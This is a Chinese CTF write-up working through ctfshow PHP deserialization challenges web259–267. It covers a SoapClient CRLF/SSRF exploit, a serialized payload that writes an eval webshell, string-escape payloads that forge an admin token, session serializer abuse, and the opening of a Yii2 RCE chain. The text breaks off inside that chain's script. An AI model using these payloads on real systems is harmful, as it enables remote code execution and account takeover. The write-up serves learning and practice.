**通过CRLF注入，攻击者可以在HTTP响应中插入额外的头部信息或修改现有的头部信息，从而控制响应的内容或行为。**\n\n了解完基本知识点，那就开始做题吧\n\n由于源代码中没有出现任何的类和getflag方法，我们需要调用一个不存在的方法，这时可以想到触发__call魔术方法，而soapclient原生类中有_call魔术方法，所以我们需要调用soapclient原生类来构造**SSRF**（用服务器本身请求服务器），并利用**CRLF**字符来构造数据包。\n\nexp：\n\n```php\n<?php\n$ua = \"ceshi\\r\\nX-Forwarded-For: 127.0.0.1,127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 13\\r\\n\\r\\ntoken=ctfshow\";\n$client = new SoapClient(null,array('uri' => 'http://127.0.0.1/' , 'location' => 'http://127.0.0.1/flag.php' , 'user_agent' => $ua));\necho urlencode(serialize($client));\n?>\n#输出最后需要传入vip的值\n```\n\n通过GET传入vip的参数值，然后访问flag.txt就可以拿到flag了\n\n## web260\n\n```php\nif(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){\n    echo $flag;\n}\n\n```\n\n看题目的关键代码\n\n这里对传入的ctfshow参数进行序列化后做了一个正则匹配\n\n因为ctfshow_i_love_36D序列化后是s:18:\"ctfshow_i_love_36D\"; 里面是有ctfshow_i_love_36D的\n\n所以正常传入ctfshow_i_love_36D就可以拿到flag了。\n\n## web261\n\n```php\nclass ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n\n    public function __construct($u,$p){\n        \t\t$this->username=$u;\n        \t\t$this->password=$p;\n    }\n    public function __wakeup(){\n        if($this->username!='' || $this->password!=''){\n            die('error');\n        }\n    }\n   \tpublic function __invoke(){\n        \t\teval($this->code);\n    \t\t}\n\n    public function __sleep(){\n        $this->username='';\n        $this->password='';\n    }\n    \t\tpublic function __unserialize($data){\n        \t\t$this->username=$data['username'];\n        \t\t$this->password=$data['password'];\n        \t\t$this->code = $this->username.$this->password;\n   \t\t }\n    \t\tpublic function __destruct(){\n        \t\tif($this->code==0x36d){\n            \t\tfile_put_contents($this->username, $this->password);\n        \t\t}\n    \t\t}\n}\n\nunserialize($_GET['vip']);\n```\n\n又出现了几个新的魔术方法\n\n### __wakeup()魔术方法\n\n**调用unserialize()时触发**，反序列化恢复对象之前调用该方法，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。\n\n正常来说`wakeup`魔术方法会先被触发，然后再进行反序列化\n\n### __invoke()魔术方法\n\n当你尝试将一个对象像函数一样调用时，`__invoke()` 会被触发。\n\n### __sleep()魔术方法\n\n**调用serialize()时触发** ，在对象被序列化前自动调用，常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。**serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作**。此功能可以**用于清理对象**，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误\n\n此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。\n\n如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，wakeup() 方法会被忽略。\n\nexp:\n\n```php\n<?php\nclass ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n    public function __wakeup(){\n        if($this->username!='' || $this->password!=''){\n            die('error');\n        }\n    }\n    public function __unserialize($data){\n        $this->username=$data['username'];\n        $this->password=$data['password'];\n        $this->code = $this->username.$this->password;\n    }\n    public function __destruct(){\n        if($this->code==0x36d){\n            file_put_contents($this->username, $this->password);\n        }\n    }\n}\n$a = new ctfshowvip();\n$a -> username = \"877.php\";\n$a -> password = \"<?php eval(\\$_POST['cmd']);?>\";\n$b = serialize($a);\necho urlencode($b);\n```\n\n将序列化后的字符串传入vip，接着访问877 .php,再进行蚁剑连接就行了\n\n## web262\n\n这里就是字符串逃逸了\n\n### 字符串逃逸\n\n这个可谓是常用的姿势了，那么原理是什么呢，为什么要逃逸字符串呢\n\n#### 引子\n\n在php中，反序列化的过程必须严格按照序列化规则才能实现反序列化\n\n举个例子\n\n```php\n<?php\n$str = 'a:2:{i:0;s:5:\"admin\";i:1;s:8:\"password\";}';\nvar_dump(unserialize($str));\n//输出结果\narray(2) {\n  [0]=>\n  string(5) \"admin\"\n  [1]=>\n  string(8) \"password\"\n}\n```\n\n一般情况下，按照我们的正常理解，上面例子中变量`$str`是一个标准的序列化后的字符串，按理来说改变其中任何一个字符都会导致反序列化失败。但事实并非如此。如果在`$str`结尾的花括号后加一些字符，输出结果是一样的。\n\n```php\n<?php\n$str = 'a:2:{i:0;s:5:\"admin\";i:1;s:8:\"password\";}123';\nvar_dump(unserialize($str));\n#输出结果依然和上面的相同\n```\n\n这就说明了在花括号外面的字符是不会影响字符串本身的反序列化操作的\n\n#### php反序列化的几大特性\n\n1.php在反序列化时，底层代码是以`;`作为字段的分隔，以`}`作为结尾，并且是**根据长度判断内容** ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。\n\n- 注意，字符串序列化是以`;}`结尾的，但对象序列化是直接`}`结尾\n- php反序列化字符逃逸，就是通过这个结尾符实现的，结尾符后面的内容不会影响php反序列化的结果\n\n2.当长度不对应的时候会出现报错\n\n#### 反序列化字符逃逸\n\n反序列化之所以存在字符串逃逸，最主要的原因是代码中存在针对序列化后的字符串进行了过滤操作（变多或者变少）\n\n反序列化字符逃逸问题根据过滤函数一般分为两种，字符数增多和字符数减少\n\n##### 字符增多\n\n```php\n<?php\nclass name{\n    public $username;\n    public $password;\n\n    public function __construct($username,$password){\n        $this->username=$username;\n        $this->password=$password;\n    }\n}\n$str1 = new name(\"a\",\"b\");\necho serialize($str1);\n//输出结果:\nO:4:\"name\":2:{s:8:\"username\";s:1:\"a\";s:8:\"password\";s:1:\"b\";}\n```\n\n问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是`123456`，而不是`b`？\n\n如果我们之间修改password的值的话，必然会因为字符串的个数不一样而导致报错\n\n- 正常情况下反序列化字符串**$str1**的值为`O:4:\"name\":2:{s:8:\"username\";s:1:\"a\";s:8:\"password\";s:1:\"b\";}`\n\n此时我们加上替换函数\n\n```php\n<?php\nclass name{\n    public $username;\n    public $password;\n\n    public function __construct($username,$password){\n        $this->username=$username;\n        $this->password=$password;\n    }\n}\nfunction filter($s){\n    return str_replace(\"x\",\"yy\",$s);\n}\n$str1 = new name(\"a\",\"b\");\n```\n\n那么把username的值变为`x`，当完成序列化，filter函数处理后的结果为\n\n```php\nO:4:\"name\":2:{s:8:\"username\";s:1:\"x\";s:8:\"password\";s:1:\"b\";}//替换前\nO:4:\"name\":2:{s:8:\"username\";s:1:\"yy\";s:8:\"password\";s:1:\"b\";}//替换后\n```\n\n替换成功了，然后我们进行反序列化会发现反序列化失败了，这是因为替换后的字符串的长度不对应导致的\n\n- 所以，我们是否可以利用多出来的字符串做一些坏事？\n\n想要password是`123456`，反序列化化前的字符串要是 `O:4:\"name\":2:{s:8:\"username\";s:1:\"a\";s:8:\"password\";s:6:\"123456\";}`\n\n如果说我们输入的是\n\n`O:4:\"name\":2:{s:8:\"username\";s:1:\"a\";s:8:\"password\";s:6:\"123456\";}\";s:8:\"password\";s:1:\"b\";}`\n\n那么此时我们就需要把`\";s:8:\"password\";s:6:\"123456\";}`给挤出来，让`\";s:8:\"password\";s:1:\"b\";}`失效，我们该如何构造字符逃逸呢？\n\n已知admin会换成hacker，多出一个字符，我们对比替换前后的字符再加上我们需要构造的序列化字符串\n\n```\nO:4:\"name\":2:{s:8:\"username\";s:2:\"ax\";s:8:\"password\";s:1:\"b\";}//替换前\nO:4:\"name\":2:{s:8:\"username\";s:2:\"ayy\";s:8:\"password\";s:1:\"b\";}//替换后\nO:4:\"name\":2:{s:8:\"username\";s:1:\"a\";s:8:\"password\";s:6:\"123456\";}\";s:8:\"password\";s:1:\"b\";}//需要构造的序列化字符串\n```\n\n那么我们需要逃逸的字符串就是\n\n```\n\";s:8:\"password\";s:6:\"123456\";}//个数为31\n```\n\n需要逃逸31个字符，一个x可以换成2个y，多出一个字符，那我们构造31个x，这样替换后多出来的31个y就可以把我们需要逃逸的字符串挤出来\n\n![image-20250321210048777](../image/achieve/202411/反序化-ctfshow/image-20250321210048777.png)\n\n上下进行对比，可以看到username的内容的长度是一致的，此时`s:8:\"password\";s:6:\"123456\";}`就替换掉了`s:8:\"password\";s:1:\"b\";}`的内容，因为两个变量的长度都是和内容对应一致的，那么此时反序列化操作是不会受影响的，多余的子串会被抛弃\n\n##### 字符减少\n\n```php\n<?php\nclass name{\n    public $username;\n    public $password;\n\n    public function __construct($username,$password){\n        $this->username=$username;\n        $this->password=$password;\n    }\n}\nfunction filter($s){\n    return str_replace(\"xx\",\"y\",$s);\n}\n$str1 = new name(\"a\",\"b\");\n```\n\n问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是`123456`，而不是`biubiu`？\n\n正常情况下反序列化字符串**$str1**的值为 `O:4:\"name\":2:{s:8:\"username\";s:1:\"a\";s:8:\"password\";s:1:\"b\";}`\n\n如果我们的username的值是xx呢？\n\n```\nO:4:\"name\":2:{s:8:\"username\";s:2:\"y\";s:8:\"password\";s:1:\"b\";}\n```\n\n成功替换并且少了一个字符，那么我们该如何利用字符减少的方法去进行字符串逃逸呢？\n\n假如我们需要让password的值为123456，那么我们最终要实现的序列化字符串就是\n\n```\nO:4:\"name\":2:{s:8:\"username\";s:2:\"y\";s:8:\"password\";s:6:\"123456\";}\n```\n\n那么此时我们就需要让`\";s:8:\"password\";s:1:\"b\";}`失效，我们该如何构造字符逃逸呢？\n\n```\nO:4:\"name\":2:{s:8:\"username\";s:2:\"y\";s:8:\"password\";s:1:\"b\";}“;s:8:\"password\";s:6:\"123456\";}\n```\n\n和字符增多不同的是，需要逃逸的字符是不变的，但是我们需要计算的长度是要使之失效的字符的长度\n\n```\n\";s:8:\"password\";s:1:\"b\";}//26个\n```\n\n需要替换掉26个字符，已知传入xx会替换成y，减少一个字符，那我们需要让最后的y是26个，那么就需要传入52个x\n\n![image-20250321211735531](../image/achieve/202411/反序化-ctfshow/image-20250321211735531.png)\n\n从图中可以看到，username的上下的长度是一样的，所以反序列化不会受影响\n\n### 总结\n\n- 当字符增多：在输入的时候再加上精心构造的字符。经过过滤函数，字符变多之后，就把我们构造的给挤出来。从而实现字符逃逸\n- 当字符减少：在输入的时候再加上精心构造的字符。经过过滤函数，字符减少后，会把原有的吞掉，使构造的字符实现代替\n\n### 题目\n\n```php\nerror_reporting(0);\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) && isset($m) && isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    setcookie('msg',base64_encode($umsg));\n    echo 'Your message has been sent';\n}\n\nhighlight_file(__FILE__);\n```\n\nsetcookie('msg',base64_encode($umsg));    echo 'Your message has been sent';\n\n- PHP 的 `setcookie()` 函数被用来设置一个名为 `msg` 的 cookie，其值是对变量 `$umsg` 进行 Base64 编码后的结果。接着，页面向用户显示一条消息：“Your message has been sent”。\n\n可以在注释中看到有一个message.php文件，访问一下\n\n```php\ninclude('flag.php');\n\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    }\n}\n\nif(isset($_COOKIE['msg'])){\n    $msg = unserialize(base64_decode($_COOKIE['msg']));\n    if($msg->token=='admin'){\n        echo $flag;\n    }\n}\n```\n\n正常来说，这里只有from，msg，to传递值，即这三个属性是可控的\n\n```php\n<?php\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token = \"user\";\n    public function __construct(){\n        $this->from = \"1\";\n        $this->msg = \"2\";\n        $this->to = \"3\";\n    }\n}\n$m = new message();\n$a = serialize($m);\necho $a;\n?>\nO:7:\"message\":4:{s:4:\"from\";s:1:\"1\";s:3:\"msg\";s:1:\"2\";s:2:\"to\";s:1:\"3\";s:5:\"token\";s:4:\"user\";}\n```\n\n题目告诉我们我们需要将tooken改成admin才能拿到flag，那就用字符串逃逸试试\n\n首先要知道这里是将`fuck`修改成了`loveU`,由4个字符长度，变成了5个，长度发生了变化，导致了反序列化字符串结构改变。\n\n那我们测试一下\n\n```php\n<?php\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token = \"user\";\n    public function __construct(){\n        $this->from = \"1fuck\";\n        $this->msg = \"2\";\n        $this->to = \"3\";\n    }\n}\n$msg = new message();\n$umsg =str_replace('fuck', 'loveU', serialize($msg));\necho $umsg;\n?>\nO:7:\"message\":4:{s:4:\"from\";s:5:\"1loveU\";s:3:\"msg\";s:1:\"2\";s:2:\"to\";s:1:\"3\";s:5:\"token\";s:4:\"user\";}    \n\n```\n\n可以看到这里的fuck被换成了loveU,所以我们在原来的字符串上加入我们想要改的\n\nO:7:\"message\":4:{s:4:\"from\";s:1:\"1\";s:3:\"msg\";s:1:\"2\";s:2:\"to\";s:1:\"3\";s:5:\"token\";s:5:\"admin\";}\";s:5:\"token\";s:4:\"user\";}\n\n算一下我们添加的字符串有27个字符，已知一个fuck会换成一个loveU,多出来一个字符，所以我们需要构造27个fuck进行字符串逃逸\n\n```php\n<?php\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token = \"user\";\n    public function __construct(){\n        $this->from = \"1\";\n        $this->msg = \"2\";\n        $this->to = '3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}';\n    }\n}\n$msg = new message();\n$umsg =str_replace('fuck', 'loveU', serialize($msg));\necho $umsg;\n?>\n\n```\n\n输出的字符串是:\n\nO:7:\"message\":4:{s:4:\"from\";s:1:\"1\";s:3:\"msg\";s:1:\"2\";s:2:\"to\";s:136:\"3loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU\";s:5:\"token\";s:5:\"admin\";}\";s:5:\"token\";s:4:\"user\";}\n\n因为多出了27个字符，所以后面的\";s:5:\"token\";s:4:\"user\";}部分的内容会被当作无效部分被忽略\n\n构造payload通过get传入就行了\n\n还有第二种解法也就是非预期解\n\n### 非预期解\n\n直接通过构造一个construct()魔术方法将token的值改成admin，然后将的出来的序列化字符串编码后通过cookie传入就可以拿到flag了\n\n## web263\n\n![image-20241103215255493](./../image/achieve/202411/image-20241103215255493-1730810732122-3.png)\n\n是一个登录界面\n\n账号密码都写1 试试，结果显示登录错误\n\n抓个包看看\n\n![image-20241103215445939](./../image/achieve/202411/image-20241103215445939.png)\n\n发现cookie那有PHPSESSID，判断应该是session反序列化\n\n那就先介绍一下知识点\n\n### session反序列化\n\n讲到session反序列化，我们需要先了解什么是session\n\n### 概念\n\n#### session\n\n`Session`一般称为“会话控制“，简单来说就是是一种客户与网站/服务器更为安全的对话方式。一旦开启了 `session` 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同，这里我们讲一下PHP session机制\n\n`PHP session`可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，`PHP Session` 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 `session` 值会存储于服务器端，这也是与 `cookie`的主要区别，所以`seesion` 的安全性相对较高。\n\n那我们为什么要用session呢?\n\n我们访问网站的时候使用的协议是http或者https，但是http是一种无状态协议，是没有记忆的，也就是说，每次请求都是独立的，服务器不会记得上一次请求的信息，所以session能用来弥补这个缺点，帮助服务器跟踪用户状态\n\n那session是通过什么来跟踪的呢？这里就用到了sessionID 生成与存储了\n\n当我们首次访问一个网站的时候，此时会话就开始了，就会产生一个独一无二的ID，然后产生了cookie，`cookie`是一个缓存用于一定时间的身份验证，在同一域名下面是全局的，所以说在同一域名下的页面都可以访问到`cookie`,但是大家都知道`cookie`我们是可以进行修改的,所以`cookie`和`session`有本质的不同\n\n当开始一个会话时，PHP会尝试从请求中查找会话ID，（通常通过会话 `cookie`），如果发现请求的`Cookies`、`Get`、`Pos`t中不存在`session id`，PHP 就会自动调用`php_session_create_id`函数创建一个新的会话，并且在`http response`中通过`set-cookie`头部发送给客户端保存\n\n- **Session**：数据存储在服务器端，客户端仅保存一个唯一的会话 ID，用于与服务器通信。\n- **Cookie**：数据存储在客户端浏览器中，服务器不存储这些数据。\n\n#### session的产生和存储\n\nsession_start()会创建新会话或者重用现会话。如果会话ID是通过GET,POST或者使用cookie提交，则会重用现有会话\n\n当会话自动开始或者通过session_start()手动开始的时候，PHP内部会调用open和read回调函数，会话处理程序可能是PHP默认的，也可能是扩展提供的，也可能是通过session_set_save_handler()设定的用户自定义会话处理程序。通过read回调函数返回的现有会话数据(使用特殊的序列化格式存储)，PHP会自动反序列化数据并且填充$_SESSION超级全局变量\n\n那我们先来看看存储的路径在哪里:\n\n```PHP\n<?php \t\n\tshow_source(__FILE__);\n\tsession_start();\n\techo session_id();\n\techo $_COOKIE[\"PHPSESSID\"];\n?>\n```\n\n![img](./../image/achieve/202411/反序化-ctfshow/QQ20240912-111641.png)\n\n![img](./../image/achieve/202411/QQ20240912-111713.png)\n\n可以发现这些是保存在临时文件目录里面\n\n```\n/var/lib/php5/sess_PHPSESSID\n/var/lib/php7/sess_PHPSESSID\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSED\n```\n\n这些是常见的保存位置，那我们接下来看一下php.ini中对session的配置\n\n#### session在php.ini的配置\n\n先看看php.ini中对session的配置\n\n```php\nsession.save_path = \"/tmp\"\n#session保存到/tmp目录\nsession.save_handler = files\n#session的存储方式。这里是存储为文件\nsession.serialize_handler = php\n#session默认的序列化引擎是php\nsession.auto_start = 0\n#session是否默认打开。即是否默认开启session_start()\nsess_sessionid\n#session默认是以sess_随机字符串命名\n```\n\nPHP session`的存储机制是由`session.serialize_handler`来定义引擎的，默认是以文件的方式存储，且存储的文件是由`sess_sessionid`来决定文件名的，当然这个文件名也不是不变的，如`Codeigniter`框架的 `session`存储的文件名为`ci_sessionSESSIONID\n\n当然文件的内容始终是session的值序列化后的内容\n\n上面也提到了session的序列化引擎，下面介绍了三种引擎\n\n```\nphp:存储方式是，键名+竖线+经过serialize()函数序列处理的值\nphp_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值\nphp_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值\n```\n\n在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set('session.serialize_handler', '需要设置的引擎');。\n\n```PHP\n<?php\nini_set('session.serialize_handler', 'php');\n// ini_set('session.serialize_handler', 'php_binary');\n// ini_set('session.serialize_handler', 'php_serialize');\nsession_start();\n$_SESSION['bao']=$_GET['a'];\n```\n\n得到\n\n```php\nphp:  bao|s:2:\"18\";\n\nphp_binary:       baos:2:\"18\";\n\nphp_serialize(php>5.5.4):        a:1:{s:3:\"bao\";s:2:\"18\";}\n```\n\n### 反序列化\n\n当会话开始时，session_start()即会话开始时。session就会通过指定的序列化引擎将`$_SESSION`序列化。然后放入文件进行存储。那么当我们再次开启对话的时候他也会进行自动的反序列化来填充`$_SESSION`\n\n```php\nsession_start()\n#session_start()->读取session文件内容->反序列化\n$_SESSION['name']='test';\n#serialize($_SESSION)->存入文件\n```\n\n那么如果此时开发者使用的引擎与默认引擎不同，是不是就会产生歧义，此时我们利用数据的存储形式不同的漏洞是不是就可以任意触发魔术方法进行利用了\n\n也就是说，**Session反序列化都是序列化引擎不一致导致存在安全问题**\n\n## 解题\n\n通过dirsearch扫描目录可以发现一个www.zip，下载解压下来发现有三个php文件\n\nindex.php\n\n```php\n<?php\n\terror_reporting(0);\n\tsession_start();\n\t//超过5次禁止登陆\n\tif(isset($_SESSION['limit'])){\n\t\t$_SESSION['limti']>5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n\t\t$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);\n\t}else{\n\t\t setcookie(\"limit\",base64_encode('1'));\n\t\t $_SESSION['limit']= 1;\n\t}\n?>\n```\n\n在index.php 我们发现$_SESSION['limit']我们可以进行控制\n\ncheck.php\n\n```php\n<?php\n\nerror_reporting(0);\nrequire_once 'inc/inc.php';\n$GET = array(\"u\"=>$_GET['u'],\"pass\"=>$_GET['pass']);\n\n\nif($GET){\n\n\t$data= $db->get('admin',\n\t[\t'id',\n\t\t'UserName0'\n\t],[\n\t\t\"AND\"=>[\n\t\t\"UserName0[=]\"=>$GET['u'],\n\t\t\"PassWord1[=]\"=>$GET['pass'] //密码必须为128位大小写字母+数字+特殊符号，防止爆破\n\t\t]\n\t]);\n\tif($data['id']){\n\t\t//登陆成功取消次数累计\n\t\t$_SESSION['limit']= 0;\n\t\techo json_encode(array(\"success\",\"msg\"=>\"欢迎您\".$data['UserName0']));\n\t}else{\n\t\t//登陆失败累计次数加1\n\t\t$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit'])+1);\n\t\techo json_encode(array(\"error\",\"msg\"=>\"登陆失败\"));\n\t}\n}\n```\n\n访问index.php，建立session，并获得cookie，将编码后的字符串放入limit中保存，并刷新\n\n![image-20241104224521247](./../image/achieve/202411/image-20241104224521247.png)\n\n之后访问check.php,让我们的webshell成功写入\n\n访问我们的1.php并用蚁剑连接就行了\n\n## web264\n\n```php\nerror_reporting(0);\nsession_start();\n\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) && isset($m) && isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    $_SESSION['msg']=base64_encode($umsg);\n    echo 'Your message has been sent';\n}\n\nhighlight_file(__FILE__);\n```\n\n看到注释中有message.php，打开看一下\n\n```php\nsession_start();\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    }\n}\n\nif(isset($_COOKIE['msg'])){\n    $msg = unserialize(base64_decode($_SESSION['msg']));\n    if($msg->token=='admin'){\n        echo $flag;\n    }\n}\n```\n\n其实就是web262和web263的结合，不能说结合吧，只是利用了session的一些基础知识+字符串逃逸\n\n不过这个题没有设置session反序列化的处理器\n\n先进行字符串逃逸构造我们的序列化字符串\n\n![image-20241105105115767](./../image/achieve/202411/image-20241105105115767.png)\n\n发送后可以看到我们建立了一个会话phpsessid，页面提示我们message发送成功\n\n那我们访问message.php，在cookie里面设置msg的值就可以了\n\n## web265\n\n```php\nerror_reporting(0);\ninclude('flag.php');\nhighlight_file(__FILE__);\nclass ctfshowAdmin{\n    public $token;\n    public $password;\n\n    public function __construct($t,$p){\n        $this->token=$t;\n        $this->password = $p;\n    }\n    public function login(){\n        return $this->token===$this->password;\n    }\n}\n\n$ctfshow = unserialize($_GET['ctfshow']);\n$ctfshow->token=md5(mt_rand());\n\nif($ctfshow->login()){\n    echo $flag;\n}\n```\n\n- $ctfshow->token=md5(mt_rand());\n\n1. **`mt_rand()`**：这是一个PHP函数，用于生成一个随机整数。默认情况下，它会生成一个介于0和`mt_getrandmax()`之间的整数，其中`mt_getrandmax()`是一个很大的数，具体取决于PHP的编译方式和平台。\n2. **`md5()`**：这是另一个PHP函数，用于计算给定字符串的MD5哈希值\n\n这道题只需要让password等于token就行了，由于token的值是随机数的md5值，我们无法确定token的具体数值，所以我们可以用php的指针进行解题\n\n### php指针\n\n在PHP中，函数指针（function pointer）是指能够保存函数的引用并将其作为参数传递给其他函数的变量。它允许在运行时动态地引用和调用函数，增强了代码的灵活性和可重用性。\n\n注意：函数指针在PHP中并不是真正的指针，而是一个保存函数引用的变量。它们并不像在底层语言中那样直接操作内存地址。\n\nphp中引用(&)的意思是：**不同的名字访问同一个变量内容**。\n\n与Ｃ语言中的指针是有差别的．Ｃ语言中的指针里面存储的是变量的内容，在内存中存放的地址。\n\n#### 变量的引用\n\nPHP 的引用允许你用两个变量来指向同一个内容\n\n```php\n<?php\n    $a=\"ABC\";\n    $b =&$a;\n    echo $a;//这里输出:ABC\n    echo $b;//这里输出:ABC\n    $b=\"EFG\";\n    echo $a;//这里$a的值变为EFG 所以输出EFG\n    echo $b;//这里输出EFG\n?>\n```\n\n所以直接构造exp:通过__construct魔术方法构造\n\n```php\n<?php\n\nclass ctfshowAdmin{\n    public $token;\n    public $password;\n\n    public function __construct(){\n        $this->password=&$this->token;\n    }\n}\necho serialize(new ctfshowAdmin());\n/*\nO:12:\"ctfshowAdmin\":2:{s:5:\"token\";N;s:8:\"password\";R:2;}\n其中R是指针引用，R:2: 表示password属性指向序列化字符串中的第二个对象\n*/\n\n```\n\n将password属性的值指向token的值，password的值随着token的改变而改变\n\nphp序列化中大写字母R代表引用类型，值为一个数字，指示是从根开始的、也就是从对象本身开始的第几个项目，从1开始数，如果要引用对象本身，序列化后为`R:1;`如果要引用对象内第一个元素，序列化后则为`R:2`。不论变量间是如何互相引用的，在序列化过程中php无从得知，php只知道哪几个值的地址一模一样，所以php只会将最先出现的值记录下来，后续出现有相同地址的变量就将其值描述为对它的引用。\n\n把序列化后的字符串传入ctfshow参数中就可以了\n\n## web266\n\n```php\nhighlight_file(__FILE__);\n\ninclude('flag.php');\n$cs = file_get_contents('php://input');\n\n\nclass ctfshow{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public function __construct($u,$p){\n        $this->username=$u;\n        $this->password=$p;\n    }\n    public function login(){\n        return $this->username===$this->password;\n    }\n    public function __toString(){\n        return $this->username;\n    }\n    public function __destruct(){\n        global $flag;\n        echo $flag;\n    }\n}\n$ctfshowo=@unserialize($cs);\nif(preg_match('/ctfshow/', $cs)){\n    throw new Exception(\"Error $ctfshowo\",1);\n}\n```\n\n### file_get_contents('php://input')\n\n这行代码用于读取原始POST数据。`php://input` 是一个只读流，它允许你读取请求的原始数据。当你使用 `file_get_contents('php://input')` 时，它会返回请求体的内容\n\n### __toString()方法\n\n当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串\n\n这里过滤了ctfshow，那我们就用大小写绕过，因为这里是对$cs进行的过滤验证，所以我们的传参应该是传入这个$cs参数里面\n\n构造payload:\n\n```php\n赋值给username和password随便什么都行，因为都会触发__destruct，就会return flag\n<?php \nclass cTfshow{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n}\necho serialize(new cTfshow());\n?>\n\n```\n\n注意hackbar是不能直接传值的，必须传键值对，所以我们用bp发包\n\n### 破坏结构进行析构\n\n就是说，传入一个破坏了反序列化字符串结构的字符串进去，使得，即使异常了，也会析构。\n\n![img](./../image/achieve/202411/2087645-20210827172129842-504516145-1730809434067-2.png)\n\n## web267\n\n页面看着也是挺懵的，一时间找不到做题的方向，就只能先看wp了，发现是yii反序列化\n\n### YII反序列化\n\n#### 先讲讲YII框架\n\nYii 是一个适用于开发 Web2.0 应用程序的高性能PHP 框架。\n\nYii 是一个通用的 Web 编程框架，即可以用于开发各种用 PHP 构建的 Web 应用。 因为基于组件的框架结构和设计精巧的缓存支持，它特别适合开发大型应用， 如门户网站、社区、内容管理系统（CMS）、 电子商务项目和 RESTful Web 服务等。\n\nYii 当前有两个主要版本：1.1 和 2.0。 1.1 版是上代的老版本，现在处于维护状态。 2.0 版是一个完全重写的版本，采用了最新的技术和协议，包括依赖包管理器 Composer、PHP 代码规范 PSR、命名空间、Traits（特质）等等。 2.0 版代表新一代框架，是未来几年中我们的主要开发版本。\n\nYii 2.0 还使用了 PHP 的最新特性， 例如命名空间 和Trait（特质）\n\n#### 漏洞描述\n\nYii2 2.0.38 之前的版本存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令\n\n具体链接:[yii反序列化漏洞复现及利用_yii框架漏洞-CSDN博客](https://blog.csdn.net/cosmoslin/article/details/120612714)\n\n[Yii2反序列化漏洞(CVE-2020-15148)分析学习 | Extraderの博客](https://www.extrader.top/posts/c79847ee/#Yii2介绍)\n\n先用弱口令登录admin/admin试试，发现可以登录，然后在一番寻找中在about的源代码里面找到了\n\n![image-20241105194244638](./../image/achieve/202411/image-20241105194244638-1730809434066-1.png)\n\n那就查看view-source\n\n然后page中可以看到多了一行代码\n\n![image-20241105194335720](./../image/achieve/202411/image-20241105194335720-1730809434067-3-1730810886540-13.png)\n\n使用大佬的脚本\n\n```php\n<?php\n # 请在命令行下执行php yii反序列化.php命令运行此脚本\n # 脚本将生成一个序列化后的字符串，将其保存到文件中，并将其发送到目标服务器执行\n # 目标服务器将反序列化此字符串，并执行命令cat /flag\n # 脚本使用了Faker\\Generator类，该类会自动调用IndexAction类的run方法，执行命令cat /flag\n # 脚本使用了yii\\db\\BatchQueryResult类，该类会自动调用Faker\\Generator类的构造函数，并生成一个序列化后的字符串\n # 